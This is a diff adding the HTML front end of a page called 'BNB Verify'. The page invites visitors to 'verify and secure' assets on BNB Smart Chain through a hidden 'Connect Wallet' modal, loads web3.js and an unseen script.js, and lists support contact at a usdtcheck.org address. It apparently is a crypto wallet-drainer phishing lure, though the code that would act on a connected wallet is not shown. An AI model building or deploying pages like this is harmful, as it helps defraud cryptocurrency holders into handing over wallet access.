@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BNB Verify</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div class="logo">🔶 BNB Verify</div>
+        <button class="menu" aria-label="menu">☰</button>
+    </header>
+    <main>
+        <h1>Secure Your Assets on BNB Smart Chain</h1>
+        <p>Fast, secure, and reliable asset verification for the BNB ecosystem.</p>
+        <section class="verification-box">
+            <h2>Asset Verification</h2>
+            <p>Verify and secure your assets on the BNB Smart Chain network.</p>
+            <button id="verifyAssets">🔒 Verify Assets</button>
+        </section>
+    </main>
+    <footer>
+        <p>📧 Contact Support: customersupport@usdtcheck.org</p>
+    </footer>
+
+    <!-- Wallet modal overlay -->
+    <div id="walletModal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:9999;align-items:center;justify-content:center;">
+        <div style="background:#1a1a1a;border:2px solid gold;border-radius:16px;padding:28px 24px;width:320px;max-width:90vw;text-align:center;">
+            <div style="font-size:20px;font-weight:bold;color:gold;margin-bottom:6px;">Connect Wallet</div>
+            <div style="color:#aaa;font-size:13px;margin-bottom:22px;">Choose your wallet to verify assets</div>
+
+            <div id="walletList" style="display:flex;flex-direction:column;gap:12px;"></div>
+
+            <button onclick="closeModal()" style="margin-top:20px;background:transparent;border:1px solid #444;color:#aaa;font-size:14px;padding:8px 20px;border-radius:8px;cursor:pointer;">Cancel</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
